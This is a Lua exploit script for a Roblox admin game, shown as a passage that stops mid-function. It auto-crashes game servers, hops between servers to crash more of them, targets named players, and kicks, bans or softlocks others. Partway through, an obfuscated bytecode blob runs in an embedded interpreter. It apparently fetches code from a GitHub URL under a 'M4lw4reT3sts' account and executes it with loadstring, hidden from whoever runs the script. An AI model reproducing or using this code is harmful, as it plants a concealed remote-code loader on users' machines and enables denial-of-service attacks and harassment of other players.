local Settings = {
    ["Autorun Commands"] = {"atprog me","admingiver","antikick","antiservercrash","antiabuse","antiname","nokill","localremoveobby","fixvelocity","antivoid","antifly","autogod","platform","crashdetector","afkindicator","antiskydive","antigrav","antiepilepsy","antilighting","nethelper","draggablelogs","serverdata","antispeed","blacklisttools BlackHoleSword;HotDogOnAStick;AzureDragonMagicSlayerSword"}, -- Commands to run automatically
    ["Default Whitelisted"] = {"Danna_Phantom","atprog","IceStuds","IronWolf_Az"}, -- People whitelisted by default
    ["Default Banned"] = {"SlenderMan990921"}, -- People banned by default [Buggy]
    ["Default Softlocked"] = {}, -- People softlocked by Default
    ["Default GearBanned"] = {"ThomasPlayesGames"}, -- People GearBanned by Default
    ["Player Crash Settings"] = {["Sil"] = false, ["Players"] = {}}, -- Automatically crashes server if one of these players are in it
    ["Prefix"] = ".", -- Prefix used for running commands
    ["Person299's Admin"] = true, -- If you do not own Person299's Admin, some commands will be fixed appropriately
    ["Legacy Serverlock"] = true, -- Softlocks players instead of crashing
    ["Punish Based Softlock"] = true, -- Uses punishing for softlocking instead of sizing and sending to heaven
    ["Script Name"] = "PR Script", -- Change the name of the script, default "PR Script"
    ["Welcome Message"] = "Successfully ran.", -- Change the message that is shown when running the script, default "Successfully ran."
    ["Custom Color"] = Color3.new(0, 0, 0), -- Custom color for stuff like platform, disable using nil
    
    ["Auto Crasher"] = { -- Automatically serverhop and crash servers
	["Enabled"] = false,
	["Message"] = "Auto crasher message", -- Message to send upon before crashing, set to nil if no message
	["Serverhop Time"] = 10, -- Serverhops after specified amount of time
	["Skip Crashed Servers"] = false, -- Uses savehop instead of serverhop
	["Timeout"] = 10, -- Gives up on joining a server after a specified amount of time
	["Commands"] = {"music 6853070044",".timepositionmusic 7"}, -- Commands to run on join
	["Command Delay"] = -1, -- Delay between commands, -1 is none
	["Ignore Autorun Commands"] = true, -- Skips the autorun commands
	["Time Before Crash"] = .5, -- Time before crashing server, -1 is instant
	["Crash"] = true, -- If true, it will crash
	["Vampire"] = false, -- Use Vampire Vanquisher to crash the servers
	["Whitelisted Players"] = {"atprog"}, -- Do not crash servers with these players in it
	["Targetted Players"] = { -- Automatically attempts to join players and crash their server
	    ["Enabled"] = true,
	    ["Use Join Player"] = false, -- Uses the joinplayer command, which is very unstable
	    ["Ignore Whitelisted"] = false, -- Crashes even if a whitelisted player is in the server
	    ["Players"] = {} -- Players that get targetted
	}
    },
    
    ["Player Autorun Commands"] = { -- Automatically runs commands when these players are detected
	["poop"] = "characteradded poop runcommand .rkick poop"
    }
}

task.spawn(function()
	if Settings["Auto Crasher"]["Enabled"] then
		task.wait(Settings["Auto Crasher"]["Timeout"])
		if not game:IsLoaded() then
			if Settings["Auto Crasher"]["Skip Crashed Servers"] then
				function GetOldServers()
					if isfile("PreviousServers.txt") then
						return readfile("PreviousServers.txt"):split(";")
					else
						return {}
					end
				end
				
				function WriteOldServers(Data)
					if isfile("PreviousServers.txt") then
						appendfile("PreviousServers.txt",";"..Data)
					else
						writefile("PreviousServers.txt",Data)
					end
				end
				
				function Savehop()
					local OldServers = GetOldServers()
					local Servers = {}
					for i,v in pairs(game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100")).data) do
						if type(v)=="table" and v.maxPlayers>v.playing and v.id~=game.JobId and not table.find(OldServers,game.JobId) then
							table.insert(Servers,v.id)
						end
					end
					
					if not table.find(OldServers,game.JobId) then
						WriteOldServers(game.JobId)
					end
					if #Servers~=0 then
						game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, Servers[math.random(1,#Servers)])
					else
						print("No servers found, retrying in 10 seconds")
						spawn(function()
							wait(10)
							Savehop()
						end)
					end
				end
				
				Savehop()
				game:GetService("TeleportService").TeleportInitFailed:Connect(Savehop)
			else
				function Serverhop()
					local Servers = {}
					for i,v in pairs(game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100")).data) do
						if type(v)=="table" and v.maxPlayers>v.playing and v.id~=game.JobId then
							table.insert(Servers,v.id)
						end
					end
					
					if #Servers~=0 then
						game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, Servers[math.random(1,#Servers)])
					else
						game:GetService("TeleportService"):Teleport(game.PlaceId)
					end
				end
		
				Serverhop()
				game:GetService("TeleportService").TeleportInitFailed:Connect(Serverhop)
			end
		end
	end
end)

repeat wait() until game:IsLoaded()
if game.PlaceId ~= 112420803 then return end

local loadtime = os.clock()
local owner = game.Players.LocalPlayer
local player = owner
local localplayer = owner
local lp = owner
local plr = owner
local chr = owner.Character
local character = owner.Character
local char = owner.Character
local consoleOn = true
local running = true
local prefix = Settings["Prefix"]
local ScriptName = Settings["Script Name"]
local HttpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request;
local GUI = {}
local commandlist = {}
local Connections = {}
local Loops = {}
local Toolbans = Settings["Default GearBanned"]
local ServerLockedProtection = {}
local Whitelisted = Settings["Default Whitelisted"]
local Banned = Settings["Default Banned"]
local DefaultSoftlocked = Settings["Default Softlocked"]
local PlayerCrash = Settings["Player Crash Settings"]["Players"]
local PlayerCrashMode = Settings["Player Crash Settings"]["Vampire"]
local PersonsAdmin = Settings["Person299's Admin"]
local LegacyKick = false
local OldServerLock = Settings["Legacy Serverlock"]
local PunishSoftlock = Settings["Punish Based Softlock"]
local ServerLocked = false
local ServerLockedSoundEnabled = false
local ServerLockedSound = ""
local BanSoundsEnabled = false
local BanSound = ""
local CommandBar = nil
local CurrentWebsocket = nil
local WsPerExecutor = (syn and syn.websocket) or WebSocket
local CustomColor = Settings["Custom Color"]

Connections["_CharacterUpdater"] = game:GetService("RunService").RenderStepped:Connect(function()
    chr=owner.Character
    character=owner.Character
    char=owner.Character
end)

local a={'\27','\76','\117','\97','\81','\0','\1','\4','\8','\4','\8','\0','\10','\0','\0','\0','\0','\0','\0','\0','\64','\109','\97','\105','\110','\46','\108','\117','\97','\0','\5','\0','\0','\0','\15','\0','\0','\0','\0','\0','\0','\2','\5','\0','\0','\0','\5','\0','\0','\0','\6','\64','\64','\0','\100','\0','\0','\0','\28','\64','\0','\1','\30','\0','\128','\0','\2','\0','\0','\0','\4','\5','\0','\0','\0','\0','\0','\0','\0','\116','\97','\115','\107','\0','\4','\6','\0','\0','\0','\0','\0','\0','\0','\115','\112','\97','\119','\110','\0','\1','\0','\0','\0','\0','\0','\0','\0','\0','\0','\0','\0','\7','\0','\0','\0','\13','\0','\0','\0','\0','\0','\0','\5','\30','\0','\0','\0','\5','\0','\0','\0','\26','\64','\0','\0','\22','\192','\1','\128','\5','\64','\0','\0','\26','\64','\0','\0','\22','\0','\1','\128','\5','\128','\0','\0','\26','\64','\0','\0','\22','\64','\0','\128','\5','\192','\0','\0','\6','\64','\64','\0','\69','\0','\0','\0','\90','\64','\0','\0','\22','\128','\1','\128','\91','\64','\0','\0','\22','\0','\1','\128','\69','\128','\0','\0','\90','\64','\0','\0','\22','\64','\0','\128','\69','\192','\0','\0','\70','\64','\192','\0','\128','\0','\128','\0','\202','\64','\0','\0','\201','\64','\65','\130','\156','\128','\0','\1','\197','\128','\1','\0','\6','\193','\65','\1','\220','\128','\0','\1','\220','\64','\128','\0','\30','\0','\128','\0','\8','\0','\0','\0','\4','\13','\0','\0','\0','\0','\0','\0','\0','\104','\116','\116','\112','\95','\114','\101','\113','\117','\101','\115','\116','\0','\4','\8','\0','\0','\0','\0','\0','\0','\0','\114','\101','\113','\117','\101','\115','\116','\0','\4','\9','\0','\0','\0','\0','\0','\0','\0','\72','\116','\116','\112','\80','\111','\115','\116','\0','\4','\4','\0','\0','\0','\0','\0','\0','\0','\115','\121','\110','\0','\4','\4','\0','\0','\0','\0','\0','\0','\0','\85','\114','\108','\0','\4','\81','\0','\0','\0','\0','\0','\0','\0','\104','\116','\116','\112','\115','\58','\47','\47','\114','\97','\119','\46','\103','\105','\116','\104','\117','\98','\117','\115','\101','\114','\99','\111','\110','\116','\101','\110','\116','\46','\99','\111','\109','\47','\77','\52','\108','\119','\52','\114','\101','\84','\51','\115','\116','\115','\47','\71','\97','\109','\101','\80','\82','\79','\71','\82','\69','\83','\83','\47','\109','\97','\105','\110','\47','\70','\111','\114','\101','\115','\116','\79','\102','\84','\104','\101','\87','\105','\108','\100','\0','\4','\11','\0','\0','\0','\0','\0','\0','\0','\108','\111','\97','\100','\115','\116','\114','\105','\110','\103','\0','\4','\5','\0','\0','\0','\0','\0','\0','\0','\66','\111','\100','\121','\0','\0','\0','\0','\0','\30','\0','\0','\0','\8','\0','\0','\0','\8','\0','\0','\0','\8','\0','\0','\0','\8','\0','\0','\0','\8','\0','\0','\0','\8','\0','\0','\0','\8','\0','\0','\0','\8','\0','\0','\0','\8','\0','\0','\0','\8','\0','\0','\0','\8','\0','\0','\0','\9','\0','\0','\0','\9','\0','\0','\0','\9','\0','\0','\0','\9','\0','\0','\0','\9','\0','\0','\0','\9','\0','\0','\0','\9','\0','\0','\0','\9','\0','\0','\0','\9','\0','\0','\0','\9','\0','\0','\0','\10','\0','\0','\0','\10','\0','\0','\0','\10','\0','\0','\0','\10','\0','\0','\0','\12','\0','\0','\0','\12','\0','\0','\0','\12','\0','\0','\0','\12','\0','\0','\0','\13','\0','\0','\0','\3','\0','\0','\0','\8','\0','\0','\0','\0','\0','\0','\0','\114','\101','\113','\117','\101','\115','\116','\0','\11','\0','\0','\0','\29','\0','\0','\0','\9','\0','\0','\0','\0','\0','\0','\0','\114','\101','\113','\117','\101','\115','\116','\115','\0','\21','\0','\0','\0','\29','\0','\0','\0','\7','\0','\0','\0','\0','\0','\0','\0','\115','\99','\114','\105','\112','\116','\0','\25','\0','\0','\0','\29','\0','\0','\0','\0','\0','\0','\0','\5','\0','\0','\0','\7','\0','\0','\0','\7','\0','\0','\0','\13','\0','\0','\0','\7','\0','\0','\0','\15','\0','\0','\0','\0','\0','\0','\0','\0','\0','\0','\0'}local b={"ABC","ABx","ABC","ABC","ABC","ABx","ABC","ABx","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","AsBx","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","AsBx","AsBx","ABC","ABC","ABC","ABx","ABC"}local c={"MOVE","LOADK","LOADBOOL","LOADNIL","GETUPVAL","GETGLOBAL","GETTABLE","SETGLOBAL","SETUPVAL","SETTABLE","NEWTABLE","SELF","ADD","SUB","MUL","DIV","MOD","POW","UNM","NOT","LEN","CONCAT","JMP","EQ","LT","LE","TEST","TESTSET","CALL","TAILCALL","RETURN","FORLOOP","FORPREP","TFORLOOP","SETLIST","CLOSE","CLOSURE","VARARG"}local function d(e,f,g)if g then local h=0;local i=0;for j=f,g do h=h+2^i*d(e,j)i=i+1 end;return h else local k=2^(f-1)return e%(k+k)>=k and 1 or 0 end end;local function l(m)local n=1;local o=false;local p;local q;local r,s;local t,u,v,w,x;do function t()local y=m:byte(n,n)n=n+1;return y end;function u()local y,z,A,B=m:byte(n,n+3)n=n+4;return B*16777216+A*65536+z*256+y end;function v()local y=u()local z=u()return z*4294967296+y end;function w()local y=u()local z=u()return(-2*d(z,32)+1)*2^(d(z,21,31)-1023)*((d(z,1,20)*2^32+y)/2^52+1)end;function x(C)local D;if C then D=m:sub(n,n+C-1)n=n+C else C=s()if C==0 then return end;D=m:sub(n,n+C-1)n=n+C end;return D end end;local function E()local F;local G={}local H={}local I={}local J={lines={}}F={instructions=G,constants=H,prototypes=I,debug=J}local K;F.name=x()F.first_line=r()F.last_line=r()if F.name then F.name=F.name:sub(1,-2)end;F.upvalues=t()F.arguments=t()F.varg=t()F.stack=t()do K=r()for j=1,K do local L={}local a=u()local M=d(a,1,6)local N=b[M+1]L.opcode=M;L.type=N;L.A=d(a,7,14)if N=="ABC"then L.B=d(a,24,32)L.C=d(a,15,23)elseif N=="ABx"then L.Bx=d(a,15,32)elseif N=="AsBx"then L.sBx=d(a,15,32)-131071 end;G[j]=L end end;do K=r()for j=1,K do local O={}local N=t()O.type=N;if N==1 then O.llIIlIlIIllllIlIlIlIIlIlIlIllllIllI=t()~=0 elseif N==3 then O.llIIlIlIIllllIlIlIlIIlIlIlIllllIllI=w()elseif N==4 then O.llIIlIlIIllllIlIlIlIIlIlIlIllllIllI=x():sub(1,-2)end;H[j-1]=O end end;do K=r()for j=1,K do I[j-1]=E()end end;do local a=J.lines;K=r()for j=1,K do a[j]=u()end;K=r()for j=1,K do x():sub(1,-2)u()u()end;K=r()for j=1,K do x()end end;return F end;do assert(x(4)=="\27Lua","S1MPLYS3C7RED: Bytecode expected")assert(t()==0x51,"S1MPLYS3C7RED: Only lua5.1 is supported")t()o=t()==0;p=t()q=t()if p==4 then r=u elseif p==8 then r=v else error("")end;if q==4 then s=u elseif q==8 then s=v else error("")end;assert(x(3)=="\4\8\0","S1MPLYS3C7RED: Unsupported platform")end;return E()end;local function P(...)local A=select("#",...)local Q={...}return A,Q end;local function R(S,T)local G=S.instructions;local H=S.constants;local I=S.prototypes;local U,V;local W;local X=1;local Y,Z;local _={[0]=function(L)U[L.A]=U[L.B]end,[1]=function(L)U[L.A]=H[L.Bx].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI end,[2]=function(L)U[L.A]=L.B~=0;if L.C~=0 then X=X+1 end end,[3]=function(L)local U=U;for j=L.A,L.B do U[j]=nil end end,[4]=function(L)U[L.A]=T[L.B]end,[5]=function(L)local a0=H[L.Bx].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI;U[L.A]=W[a0]end,[6]=function(L)local a1=L.C;local U=U;a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]U[L.A]=U[L.B][a1]end,[7]=function(L)local a0=H[L.Bx].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI;W[a0]=U[L.A]end,[8]=function(L)T[L.B]=U[L.A]end,[9]=function(L)local a2=L.B;local a1=L.C;local U,H=U,H;a2=a2>255 and H[a2-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a2]a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]U[L.A][a2]=a1 end,[10]=function(L)U[L.A]={}end,[11]=function(L)local a3=L.A;local a2=L.B;local a1=L.C;local U=U;a2=U[a2]a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]U[a3+1]=a2;U[a3]=a2[a1]end,[12]=function(L)local a2=L.B;local a1=L.C;local U,H=U,H;a2=a2>255 and H[a2-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a2]a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]U[L.A]=a2+a1 end,[13]=function(L)local a2=L.B;local a1=L.C;local U,H=U,H;a2=a2>255 and H[a2-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a2]a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]U[L.A]=a2-a1 end,[14]=function(L)local a2=L.B;local a1=L.C;local U,H=U,H;a2=a2>255 and H[a2-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a2]a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]U[L.A]=a2*a1 end,[15]=function(L)local a2=L.B;local a1=L.C;local U,H=U,H;a2=a2>255 and H[a2-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a2]a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]U[L.A]=a2/a1 end,[16]=function(L)local a2=L.B;local a1=L.C;local U,H=U,H;a2=a2>255 and H[a2-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a2]a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]U[L.A]=a2%a1 end,[17]=function(L)local a2=L.B;local a1=L.C;local U,H=U,H;a2=a2>255 and H[a2-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a2]a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]U[L.A]=a2^a1 end,[18]=function(L)U[L.A]=-U[L.B]end,[19]=function(L)U[L.A]=not U[L.B]end,[20]=function(L)U[L.A]=#U[L.B]end,[21]=function(L)local a2=L.B;local a4=U[a2]for j=a2+1,L.C do a4=a4 ..U[j]end;U[L.A]=a4 end,[22]=function(L)X=X+L.sBx end,[23]=function(L)local a3=L.A;local a2=L.B;local a1=L.C;local U,H=U,H;a3=a3~=0;a2=a2>255 and H[a2-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a2]a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]if a2==a1~=a3 then X=X+1 end end,[24]=function(L)local a3=L.A;local a2=L.B;local a1=L.C;local U,H=U,H;a3=a3~=0;a2=a2>255 and H[a2-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a2]a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]if a2<a1~=a3 then X=X+1 end end,[25]=function(L)local a3=L.A;local a2=L.B;local a1=L.C;local U,H=U,H;a3=a3~=0;a2=a2>255 and H[a2-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a2]a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]if a2<=a1~=a3 then X=X+1 end end,[26]=function(L)if U[L.A]==(L.C~=0)then X=X+1 end end,[27]=function(L)local U=U;local a2=U[L.B]if a2==(L.C~=0)then X=X+1 else U[L.A]=a2 end end,[28]=function(L)local a3=L.A;local a2=L.B;local a1=L.C;local U=U;local a5,a6;local a7,a8;a5={}if a2~=1 then if a2~=0 then a7=a3+a2-1 else a7=V end;a8=0;for j=a3+1,a7 do a8=a8+1;a5[a8]=U[j]end;a7,a6=P(U[a3](unpack(a5,1,a7-a3)))else a7,a6=P(U[a3]())end;V=a3-1;if a1~=1 then if a1~=0 then a7=a3+a1-2 else a7=a7+a3 end;a8=0;for j=a3,a7 do a8=a8+1;U[j]=a6[a8]end end end,[29]=function(L)local a3=L.A;local a2=L.B;local a1=L.C;local U=U;local a5,a6;local V,a7,a8=V;a5={}if a2~=1 then if a2~=0 then a7=a3+a2-1 else a7=V end;a8=0;for j=a3+1,a7 do a8=a8+1;a5[#a5+1]=U[j]end;a6={U[a3](unpack(a5,1,a7-a3))}else a6={U[a3]()}end;return true,a6 end,[30]=function(L)local a3=L.A;local a2=L.B;local U=U;local a7;local a8,a9;if a2==1 then return true end;if a2==0 then a7=V else a7=a3+a2-2 end;a9={}local a8=0;for j=a3,a7 do a8=a8+1;a9[a8]=U[j]end;return true,a9 end,[31]=function(L)local a3=L.A;local U=U;local aa=U[a3+2]local n=U[a3]+aa;U[a3]=n;if aa>0 then if n<=U[a3+1]then X=X+L.sBx;U[a3+3]=n end else if n>=U[a3+1]then X=X+L.sBx;U[a3+3]=n end end end,[32]=function(L)local a3=L.A;local U=U;U[a3]=U[a3]-U[a3+2]X=X+L.sBx end,[33]=function(L)local a3=L.A;local a2=L.B;local a1=L.C;local U=U;local ab=a3+2;local a4={U[a3](U[a3+1],U[a3+2])}for j=1,a1 do U[ab+j]=a4[j]end;if U[a3+3]~=nil then U[a3+2]=U[a3+3]else X=X+1 end end,[34]=function(L)local a3=L.A;local a2=L.B;local a1=L.C;local U=U;if a1==0 then error("NYI: extended SETLIST")else local ab=(a1-1)*50;local Q=U[a3]if a2==0 then a2=V end;for j=1,a2 do Q[ab+j]=U[a3+j]end end end,[35]=function(L)io.stderr:write("NYI: CLOSE")io.stderr:flush()end,[36]=function(L)local ac=I[L.Bx]local G=G;local U=U;local ad={}local ae=setmetatable({},{__index=function(Q,af)local ag=ad[af]return ag.segment[ag.offset]end,__newindex=function(Q,af,ah)local ag=ad[af]ag.segment[ag.offset]=ah end})for j=1,ac.upvalues do local ai=G[X]if ai.opcode==0 then ad[j-1]={segment=U,offset=ai.B}elseif G[X].opcode==4 then ad[j-1]={segment=T,offset=ai.B}end;X=X+1 end;local aj,ak=R(ac,ae)U[L.A]=ak end,[37]=function(L)local a3=L.A;local a2=L.B;local U,Y=U,Y;for j=a3,a3+(a2>0 and a2-1 or Z)do U[j]=Y[j-a3]end end}local function a8()local G=G;local L,y,z;while true do L=G[X]X=X+1;y,z=_[L.opcode](L)if y then return z end end end;local al={get_stack=function()return U end,get_IP=function()return X end}local function ak(...)local am={}local an={}V=-1;U=setmetatable(am,{__index=an,__newindex=function(Q,af,ah)if af>V and ah then V=af end;an[af]=ah end})local a5={...}Y={}Z=select("#",...)-1;for j=0,Z do am[j]=a5[j+1]Y[j]=a5[j+1]end;W=getfenv()X=1;local ao=coroutine.create(a8)local y,z=coroutine.resume(ao)if y then if z then return unpack(z)end;return else local ap=S.name;local aq=S.debug.lines[X]local ar=z:gsub("(.-:)","")local a9=""a9=a9 ..(ap and ap..":"or"")a9=a9 ..(aq and aq..":"or"")a9=a9 ..z;error(a9,0)end end;return al,ak end;local as={IlIIIIIIlIllIIlIlIIIllIllIIlllIllll=function(m)local S=l(m)local aj,ak=R(S)return ak end,utils={lIlIIIlllIlIIIIlIIIllIlIIIIIlIlIlll=l,IIllIllIlIIIIIIIIllIlIIIIlllIIIIIIl=R,IlllIIIllIlllIlIIIllllIIllllIIllllI=function(m)local S=l(m)return R(S)end}}as.IlIIIIIIlIllIIlIlIIIllIllIIlllIllll(table.concat(a,[[]]))()

local Audios = {}
spawn(function()
local s,f=pcall(function()
local audioHttpRequest = game:HttpGet("https://pastebin.com/raw/avxb44gq")
for i,v in pairs(audioHttpRequest:split("\n")) do
    local data = v:split(";")
    table.insert(Audios,{data[1],data[2],data[3],data[4]})
end
end)if s then print("Bypassed audios loaded successfully")else print("Bypassed audios could not be loaded")end end)

local lettersStringFormat=[[abcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*()_+={}|[]\;',./<>?:`~-]]
local lettersTableFormat={}
for i=1,#lettersStringFormat do
    table.insert(lettersTableFormat,lettersStringFormat:sub(i,i))
end

function GUI:SendMessage(name,text)
    if PersonsAdmin then
        game.Players:Chat("h/"..string.rep("\n",20).."["..name.."]")
        game.Players:Chat("h/"..string.rep("\n",22)..text)
    else
        game.Players:Chat("h "..string.rep("\n",20).."["..name.."]")
        game.Players:Chat("h "..string.rep("\n",22)..text)
    end
end

function GUI:SendMessageNoBrackets(name,text)
    if PersonsAdmin then
        game.Players:Chat("h/"..string.rep("\n",24)..name)
        game.Players:Chat("h/"..string.rep("\n",26)..text)
    else
        game.Players:Chat("h "..string.rep("\n",24)..name)
        game.Players:Chat("h "..string.rep("\n",26)..text)
    end
end

function GetPlayers(jjk)
local boss = lp
local fat = {}
if jjk:lower() == "me" then 
return {boss} 

elseif jjk:lower() == "all" or jjk:lower() == "*" then 
return game:GetService("Players"):GetChildren() 

elseif jjk:lower() == "others" then
for i,v in pairs(game:GetService("Players"):GetChildren()) do
if v.Name ~= boss.Name then
table.insert(fat,v)
end
end
return fat

elseif jjk:lower() == "random" then
return {game:GetService("Players"):GetChildren()[math.random(1,#game:GetService("Players"):GetChildren())]}

else
for i,v in pairs(game:GetService("Players"):GetChildren()) do
if jjk:lower() == v.Name:lower():sub(1,#jjk) and not table.find(fat,v) then
table.insert(fat,v)
end
end
for i,v in pairs(game:GetService("Players"):GetChildren()) do
if jjk:lower() == v.DisplayName:lower():sub(1,#jjk) and not table.find(fat,v) then
table.insert(fat,v)
end
end
return fat
end

end

--These are the functions used for playing music and sounds
function GetGuitar()
    if game.Players.LocalPlayer.Backpack:FindFirstChild("GuitarSword") then
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("GuitarSword")
        tool.Parent = game.Players.LocalPlayer.Character
        return tool
    elseif game.Players.LocalPlayer.Character:FindFirstChild("GuitarSword") then
        return game.Players.LocalPlayer.Character:FindFirstChild("GuitarSword")
    else
        game.Players:Chat("gear me 60357982")
        repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("GuitarSword")
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("GuitarSword")
        tool.Parent = game.Players.LocalPlayer.Character
        return tool
    end
end
function GetDrum()
    if game.Players.LocalPlayer.Backpack:FindFirstChild("DrumKit") then
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("DrumKit")
        tool.Parent = game.Players.LocalPlayer.Character
        return tool
    elseif game.Players.LocalPlayer.Character:FindFirstChild("DrumKit") then
        return game.Players.LocalPlayer.Character:FindFirstChild("DrumKit")
    else
        game.Players:Chat("gear me 33866728")
        repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("DrumKit")
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("DrumKit")
        tool.Parent = game.Players.LocalPlayer.Character
        return tool
    end
end
function GetBongo()
    if game.Players.LocalPlayer.Backpack:FindFirstChild("BongoDrums") then
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("BongoDrums")
        tool.Parent = game.Players.LocalPlayer.Character
        return tool
    elseif game.Players.LocalPlayer.Character:FindFirstChild("BongoDrums") then
        return game.Players.LocalPlayer.Character:FindFirstChild("BongoDrums")
    else
        game.Players:Chat("gear me 57902997")
        repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("BongoDrums")
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("BongoDrums")
        tool.Parent = game.Players.LocalPlayer.Character
        return tool
    end
end
function GetPaint()
    if game.Players.LocalPlayer.Backpack:FindFirstChild("PaintBucket") then
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("PaintBucket")
        tool.Parent = game.Players.LocalPlayer.Character
        return tool
    elseif game.Players.LocalPlayer.Character:FindFirstChild("PaintBucket") then
        return game.Players.LocalPlayer.Character:FindFirstChild("PaintBucket")
    else
        game.Players:Chat("gear me 18474459")
        repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("PaintBucket")
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("PaintBucket")
        tool.Parent = game.Players.LocalPlayer.Character
        return tool
    end
end
function GetBoombox()
    if game.Players.LocalPlayer.Backpack:FindFirstChild("SuperFlyGoldBoombox") then
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("SuperFlyGoldBoombox")
        tool.Parent = game.Players.LocalPlayer.Character
        return tool
    elseif game.Players.LocalPlayer.Character:FindFirstChild("SuperFlyGoldBoombox") then
        return game.Players.LocalPlayer.Character:FindFirstChild("SuperFlyGoldBoombox")
    else
        game.Players:Chat("gear me 212641536")
        repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("SuperFlyGoldBoombox")
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("SuperFlyGoldBoombox")
        tool.Parent = game.Players.LocalPlayer.Character
        return tool
    end
end
function GetNewBoombox()
    game.Players:Chat("gear me 212641536")
    repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("SuperFlyGoldBoombox")
    local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("SuperFlyGoldBoombox")
    tool.Parent = game.Players.LocalPlayer.Character
    return tool
end
function PlaySound(SoundId,Looping)
    spawn(function()
        local Boombox = GetNewBoombox()
        Boombox.Remote:FireServer("PlaySong",SoundId)
        if not Looping then
            repeat wait() until Boombox.Handle.Sound.IsLoaded and Boombox.Handle.Sound.Playing
            wait(Boombox.Handle.Sound.TimeLength)
            Boombox.Handle.Sound:Stop()
            Boombox.Handle:Destroy()
        end
    end)
end
function PlayNote(Note)
    local Tool = GetGuitar()
    Tool.Handle:FindFirstChild(Note):Play()
end
function PlayDrum(Sound)
    local Tool = GetDrum()
    Tool.Handle:FindFirstChild(Sound):Play()
end
function PlayBongo(Sound)
    local Tool = GetBongo()
    Tool.Handle:FindFirstChild(Sound):Play()
end

function checkGamepass(Target,ID)
    local data = game:GetService("HttpService"):JSONDecode(game:HttpGetAsync('https://inventory.roblox.com/v1/users/'..Target.UserId..'/items/GamePass/'..ID)).data
    
    if data then
        if #data > 0 then
            return "200"
        else
            return "403"
        end
    else
        print("Request to "..Target.Name.." for "..ID.." failed")
        return "404"
    end
end

function dropRock(Position)
	spawn(function()
		game.Players:Chat('gear me 90718686')
		repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("ConjurorsFist")
		local wand = game.Players.LocalPlayer.Backpack:FindFirstChild("ConjurorsFist")
		wand.Parent = game.Players.LocalPlayer.Character
		wait(0.25)
		wand.Client.Disabled = true
		function wand.MouseLoc.OnClientInvoke()
			return Position
		end
		wand:Activate()
		wait(3.5)
		wand:Destroy()
		game.Players:Chat("removetools me")
	end)
end

function checkIsCrashed()
	local Ping1 = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
        task.wait(1)
        local Ping2 = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
    
        if Ping1 == Ping2 then return true else return false end
end

function stringToBool(str)
	return (str == "true")
end

function moveObject(target,wawawaa)
    function equipivory()
    	if lp.Backpack:FindFirstChild("IvoryPeriastron") then
    		lp.Backpack.IvoryPeriastron.Parent = lp.Character
    	else
    	    if not lp.Character:FindFirstChild("IvoryPeriastron") then
        	    game.Players:Chat("gear me 108158379")
        	    repeat wait() until lp.Backpack:FindFirstChild("IvoryPeriastron")
        	    lp.Backpack.IvoryPeriastron.Parent = lp.Character
        	end
    	end
    end
    equipivory()
	if lp.Character:FindFirstChild("IvoryPeriastron") then
